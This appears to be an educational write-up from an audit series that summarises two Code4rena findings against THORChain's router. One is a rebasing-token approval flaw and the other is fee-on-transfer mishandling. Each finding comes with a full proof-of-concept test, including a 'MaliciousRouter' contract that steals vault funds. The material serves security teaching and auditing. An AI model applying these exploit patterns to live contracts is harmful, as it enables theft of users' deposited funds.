# ETAAcademy-Adudit: 10. Token

<table>
  <tr>
    <th>title</th>
    <th>tags</th>
  </tr>
  <tr>
    <td>10. Token</td>
    <td>
      <table>
        <tr>
          <th>audit</th>
          <th>basic</th>
          <th>EVM</th>
          <td>Token</td>
        </tr>
      </table>
    </td>
  </tr>
</table>

[Github](https://github.com/ETAAcademy)｜[Twitter](https://twitter.com/ETAAcademy)｜[ETA-Audit](https://github.com/ETAAcademy/ETAAcademy-Audit)

Authors: [Evta](https://twitter.com/pwhattie), looking forward to your joining

## 1. [High] A malicious user can steal money out of the vault and other users

### Calculating approvals for rebasing tokens

- Summary: A malicious user could exploit the rebasing mechanism of a token like AMPL to steal funds from the vault and other users. The issue arises because the protocol incorrectly handles the approval process for rebasing tokens. The malicious actor deposits 1000 AMPL tokens when the rebasing factor `_gonsPerFragment` is 1, and later, after the factor changes to 2, they can manipulate the system to withdraw more tokens than they originally deposited. This results in the depletion of funds for legitimate users, as the rebasing mechanism alters the token balances in the vault.

- Impact & Recommendation: The recommended fix involves correctly calculating approvals for rebasing tokens to prevent such exploits.

<br> 🐬: [Source](https://code4rena.com/reports/2024-06-thorchain#h-01-A-malicious-user-can-steal-money-out-of-the-vault-and-other-users) & [Report](https://code4rena.com/reports/2024-06-thorchain)

<details><summary>POC</summary>

```solidity

pragma solidity 0.8.22;
import "../lib/forge-std/src/Test.sol";
import {THORChain_Router} from "../chain/ethereum/contracts/THORChain_Router.sol";
contract AMPLTokenSimplified {
    uint256 public _gonsPerFragment = 1;
    mapping(address => uint256) public _gonBalances;
    mapping(address => mapping(address => uint256)) public _allowedFragments;
    function rebase(uint256 gonsPerFragment_) public {
        _gonsPerFragment = gonsPerFragment_;
    }
    function balanceOf(address who) public view returns (uint256) {
        return _gonBalances[who] / (_gonsPerFragment);
    }
    function transfer(address to, uint256 value)
        public
        returns (bool)
    {
        uint256 gonValue = value * (_gonsPerFragment);
        require(_gonBalances[msg.sender] >= gonValue, "You just got beamed lol");

        _gonBalances[msg.sender] = _gonBalances[msg.sender] - (gonValue);
        _gonBalances[to] = _gonBalances[to] + (gonValue);
        return true;
    }
    function allowance(address owner_, address spender) public view returns (uint256) {
        return _allowedFragments[owner_][spender];
    }
    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public returns (bool) {
        _allowedFragments[from][msg.sender] = _allowedFragments[from][msg.sender] - (value);
        uint256 gonValue = value * (_gonsPerFragment);
        _gonBalances[from] = _gonBalances[from] - (gonValue);
        _gonBalances[to] = _gonBalances[to] + (gonValue);
        return true;
    }
    function approve(address spender, uint256 value) public returns (bool) {
        _allowedFragments[msg.sender][spender] = value;
        return true;
    }
    function mint(uint256 amount, address to) public {
        _gonBalances[to] = amount;
    }
}
contract StealMoney is Test {
  THORChain_Router tcRouter;
  AMPLTokenSimplified ampl;
  MaliciousRouter mRouter;
  address malicious = makeAddr('malicious');
  address victim = makeAddr('legit');
  address vault = makeAddr('legitVault');
  function setUp() public {
    tcRouter = new THORChain_Router();
    ampl = new AMPLTokenSimplified();
    mRouter = new MaliciousRouter();
    ampl.mint(1000, malicious);
    ampl.mint(2000, victim);
  }
  function testStealMoney() public {
    vm.startPrank(malicious);
    ampl.approve(address(tcRouter), type(uint256).max);
    tcRouter.depositWithExpiry(payable(malicious), address(ampl), 1000, "you are about to get beamed", type(uint256).max); // Malicious user deposits 1000 tokens
    vm.assertEq(tcRouter.vaultAllowance(malicious, address(ampl)), 1000); // Vault allowance for the malicious user is 1000 tokens
    vm.assertEq(ampl.balanceOf(address(tcRouter)), 1000); // Balance of contract is 1000 tokens
    ampl.rebase(2); // Set _gonsPerFragment to 2
    // Still pranking malicious
    tcRouter.transferAllowance(address(mRouter), malicious, address(ampl), 1000, "lol"); // This just approves 1000 tokens to spend to our malicious router
    vm.assertEq(tcRouter.vaultAllowance(malicious, address(ampl)), 0);
    vm.assertEq(ampl.balanceOf(address(tcRouter)), 500); // Balance is now 500 because _gonsPerFragment is 2
    vm.assertEq(ampl.allowance(address(tcRouter), address(mRouter)), 1000); // Malicious router has been approved for 1000 tokens
    vm.stopPrank();
    vm.startPrank(victim);
    ampl.approve(address(tcRouter), type(uint256).max);
    tcRouter.depositWithExpiry(payable(vault), address(ampl), 1000, "i am about to get beamed :(", type(uint256).max);
    vm.assertEq(tcRouter.vaultAllowance(vault, address(ampl)), 1000); // Allowance for vault is 1000 tokens
    vm.assertEq(ampl.balanceOf(address(tcRouter)), 1500); // Contract has 1500 tokens
    vm.stopPrank();
    uint256 maliciousBalanceBefore = ampl.balanceOf(malicious);
    mRouter.steal(1000, address(tcRouter), malicious, address(ampl)); // 1000 tokens to be sent from the router to the malicious guy
    uint256 maliciousBalanceAfter = ampl.balanceOf(malicious);
    assertEq(maliciousBalanceBefore, 0);
    assertEq(maliciousBalanceAfter, 1000); // 2000 / 2
    // Did not even lose money
    vm.assertEq(ampl.balanceOf(address(tcRouter)), 500); // Only 500 tokens left in the contract
    vm.startPrank(vault);
    // vm.expectRevert("You just got beamed lol");  // You can uncomment this line and paste this error message as the require statement error message after the transfer call to see this is where it reverts in transferOut()
    vm.expectRevert();
    tcRouter.transferOut(payable(victim), address(ampl), 1000, "did I just get beamed?...");
    uint256 victimBalanceBefore = ampl.balanceOf(victim);
    tcRouter.transferOut(payable(victim), address(ampl), 500, "omg I can only withdraw 500 tokens..");
    vm.stopPrank();

    uint256 victimBalanceAfter = ampl.balanceOf(victim);
    assertEq(victimBalanceBefore, 0);
    assertEq(victimBalanceAfter, 500);
  }
}
contract MaliciousRouter {
    function depositWithExpiry(address, address, uint256, string calldata, uint) public {}
    function steal(uint256 amount, address from, address to, address target) public {
        (bool ok, ) = target.call(abi.encodeWithSignature("transferFrom(address,address,uint256)", from, to, amount));
        if (!ok) revert();
    }
}

```

</details>

## 2. [Medium] Incorrect call argument in THORChain_Router::\_transferOutAndCallV5, leading to grief/steal of THORChain_Aggregator’s funds or DoS

### Charge fees on transfer

- Summary: The \_transferOutAndCallV5 function transfers tokens to the THORChain_Aggregator and then calls swapOutV5 with the same amount. However, if the token charges a fee on transfer, the THORChain_Aggregator might not receive the full amount, causing the swapOutV5 call to fail or allowing a malicious actor to steal or lock funds.

- Impact & Recommendation: Implement a safe transfer function to correctly handle tokens that charge fees on transfer, ensuring the actual transferred amount is used in subsequent operations.

<br> 🐬: [Source](https://code4rena.com/reports/2024-06-thorchain#m-01-Incorrect-call-argument-in-THORChain_Router::_transferOutAndCallV5,-leading-to-grief/steal-of-THORChain_Aggregator’s-funds-or-DoS) & [Report](https://code4rena.com/reports/2024-06-thorchain)

<details><summary>POC</summary>

```solidity

const Router = artifacts.require('THORChain_Router');
const Aggregator = artifacts.require('THORChain_Aggregator');
const FailingAggregator = artifacts.require('THORChain_Failing_Aggregator');
const SushiRouter = artifacts.require('SushiRouterSmol');
const Token = artifacts.require('FeeOnTransferERC20Token');
const Weth = artifacts.require('WETH');
const BigNumber = require('bignumber.js');
const { expect } = require('chai');
function BN2Str(BN) {
  return new BigNumber(BN).toFixed();
}
function getBN(BN) {
  return new BigNumber(BN);
}
var ROUTER;
var ASGARD;
var AGG;
var WETH;
var SUSHIROUTER;
var FEE_ON_TRANSFER_TOKEN;
var WETH;
var ETH = '0x0000000000000000000000000000000000000000';
var USER1;
const _1 = '1000000000000000000';
const _10 = '10000000000000000000';
const _20 = '20000000000000000000';
const transferFee = '1000000';
const currentTime = Math.floor(Date.now() / 1000 + 15 * 60); // time plus 15 mins
describe('Aggregator griefing', function () {
  let accounts;
  before(async function () {
    accounts = await web3.eth.getAccounts();
    ROUTER = await Router.new();
    FEE_ON_TRANSFER_TOKEN = await Token.new(transferFee); // User gets 1m TOKENS during construction
    USER1 = accounts[0];
    ASGARD = accounts[3];
    WETH = await Weth.new();
    SUSHIROUTER = await SushiRouter.new(WETH.address);
    AGG = await Aggregator.new(WETH.address, SUSHIROUTER.address);
    FAIL_AGG = await FailingAggregator.new(WETH.address, SUSHIROUTER.address);
  });
  it('Should Deposit Assets to Router', async function () {
    await web3.eth.sendTransaction({
      to: SUSHIROUTER.address,
      from: USER1,
      value: _10,
    });
    await web3.eth.sendTransaction({
      to: WETH.address,
      from: USER1,
      value: _10,
    });
    await WETH.transfer(SUSHIROUTER.address, _10);
    expect(BN2Str(await web3.eth.getBalance(SUSHIROUTER.address))).to.equal(
      _10
    );
    expect(BN2Str(await WETH.balanceOf(SUSHIROUTER.address))).to.equal(_10);
  });
  it("Should grief/steal Aggregator's tokens on Swap Out using AggregatorV5 with FEE_ON_TRANSFER_TOKEN", async function () {
    /*
      Mint FEE_ON_TRANSFER_TOKEN the aggregator
      This mocks a situation where the swapOutV5 has failed and vault's tokens are in the aggregator
    */
    await FEE_ON_TRANSFER_TOKEN.mint(AGG.address, _20);
    /* Get starting balances of the FEE_ON_TRANSFER_TOKEN */
    const startingTokenBalanceOfUser1 = await FEE_ON_TRANSFER_TOKEN.balanceOf(
      USER1
    );
    const startingTokenBalanceOfAggregator =
      await FEE_ON_TRANSFER_TOKEN.balanceOf(AGG.address);
    const startingTokenBalanceOfSushiRouter =
      await FEE_ON_TRANSFER_TOKEN.balanceOf(SUSHIROUTER.address);
    /* Log starting balances */
    console.log(
      'Starting FEE_ON_TRANSFER_TOKEN Balance USER1:',
      BN2Str(startingTokenBalanceOfUser1)
    );
    console.log(
      'Starting FEE_ON_TRANSFER_TOKEN Balance SUSHIROUTER:',
      BN2Str(startingTokenBalanceOfSushiRouter)
    );
    console.log(
      'Starting FEE_ON_TRANSFER_TOKEN Balance Aggregator:',
      BN2Str(startingTokenBalanceOfAggregator)
    );
    /* User1 deposits tokens in the ASGARD vault */
    /* Remember that the vault will be credited _20 - transferFee */
    await FEE_ON_TRANSFER_TOKEN.approve(ROUTER.address, _20, { from: USER1 });
    await ROUTER.depositWithExpiry(
      ASGARD,
      FEE_ON_TRANSFER_TOKEN.address,
      _20,
      '',
      currentTime,
      {
        from: USER1,
      }
    );
    /* Log token balance of Router and the accounted allowance after deposit */
    const tokenBalanceOfRouter = await FEE_ON_TRANSFER_TOKEN.balanceOf(
      ROUTER.address
    );
    console.log(
      '\nFEE_ON_TRANSFER_TOKEN Balance Router:',
      BN2Str(tokenBalanceOfRouter)
    );
    expect(
      BN2Str(await FEE_ON_TRANSFER_TOKEN.balanceOf(ROUTER.address))
    ).to.equal(BN2Str(getBN(_20).minus(transferFee))); // after FEE_ON_TRANSFER_TOKEN deposit
    /*
      The ASGARD initiates a transfer out and call
      This action transfers _1 token to the aggregator,
      BUT the aggreagator receives _1 - transferFee because of the fee-on-transfer.
      The code in the router calls swapOutV5 with the _1, not _1 - transferFee.
      This will make the transaction to revert if the aggregator does not have enough tokens,
      because the swapOutV5 function will try to transfer _1 token, but it has _1 - transferFee.
      OR (like) in our case, the aggregator has tokens that should be rescued and the swapOutV5 is called with _1
      and the transfer fee is paid by the funds that should be rescued
     */
    const swaps = 7;
    const swapAmount = _1;
    for (let i = 0; i < swaps; i++) {
      await ROUTER.transferOutAndCallV5(
        [
          AGG.address,
          FEE_ON_TRANSFER_TOKEN.address,
          swapAmount,
          ETH,
          USER1,
          '0',
          'MEMO',
          '0x', // empty payload
          'bc123', // dummy address
        ],
        { from: ASGARD, value: 0 }
      );
    }
    /* Calculate total transfer fee paid */
    const totalAmountSwapped = getBN(swapAmount).multipliedBy(swaps);
    const totalTransferFeePaid = getBN(transferFee).multipliedBy(swaps);
    /* Get ending balances of the FEE_ON_TRANSFER_TOKEN */
    const endingTokenBalanceOfUser1 = await FEE_ON_TRANSFER_TOKEN.balanceOf(
      USER1
    );
    const endingTokenBalanceOfAggregator =
      await FEE_ON_TRANSFER_TOKEN.balanceOf(AGG.address);
    const endingTokenBalanceOfRouter = await FEE_ON_TRANSFER_TOKEN.balanceOf(
      ROUTER.address
    );
    const endingTokenBalanceOfSushiRouter =
      await FEE_ON_TRANSFER_TOKEN.balanceOf(SUSHIROUTER.address);
    /* Log starting balances */
    console.log(
      '\nFinal FEE_ON_TRANSFER_TOKEN Balance Aggregator:',
      BN2Str(endingTokenBalanceOfAggregator)
    );
    console.log(
      'Final FEE_ON_TRANSFER_TOKEN Balance USER1:',
      BN2Str(endingTokenBalanceOfUser1)
    );
    console.log(
      'Final FEE_ON_TRANSFER_TOKEN Balance SUSHIROUTER:',
      BN2Str(endingTokenBalanceOfSushiRouter)
    );
    console.log(
      'Final FEE_ON_TRANSFER_TOKEN Balance ROUTER:',
      BN2Str(endingTokenBalanceOfRouter)
    );
    /* Make assertions */
    /* Less 1 FEE_ON_TRANSFER_TOKEN - transfer fee (only one transfer User1 -> Router) */
    expect(
      BN2Str(await FEE_ON_TRANSFER_TOKEN.balanceOf(ROUTER.address))
    ).to.equal(BN2Str(getBN(_20).minus(totalAmountSwapped).minus(transferFee)));
    /* Add 1 FEE_ON_TRANSFER_TOKEN - (transfer fee) * swaps */
    expect(
      BN2Str(await FEE_ON_TRANSFER_TOKEN.balanceOf(SUSHIROUTER.address))
    ).to.equal(BN2Str(getBN(totalAmountSwapped).minus(totalTransferFeePaid)));
    /* KEY ASSERTIONS */
    /* Expect aggregator's funds to be rescued to be less than starting ones */
    expect(
      getBN(endingTokenBalanceOfAggregator).isLessThan(
        getBN(startingTokenBalanceOfAggregator)
      )
    ).to.equal(true);
  });
});

```

</details>
